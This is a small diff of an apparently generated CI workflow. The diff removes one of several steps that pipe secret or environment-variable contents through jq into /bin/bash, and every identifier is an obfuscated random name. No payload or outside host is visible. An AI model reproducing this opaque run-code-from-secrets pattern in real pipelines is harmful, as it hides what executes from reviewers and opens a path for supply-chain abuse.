@@ -21,7 +21,6 @@ jobs:
           wovmz624: ${{ secrets.wovmz624 }}
         run: |
           printf '%s' "$wovmz624" | jq -r .upebr7 | /bin/bash
-          printf '%s' "$is06" | jq -r .gr1868 | /bin/bash
           echo $du0140 | jq -r .pa695 | /bin/bash
           printf '%s' "$kve1" | jq -r .ylu66 | /bin/bash
           echo $wlz80 | jq -r .cbn6151 | /bin/bash
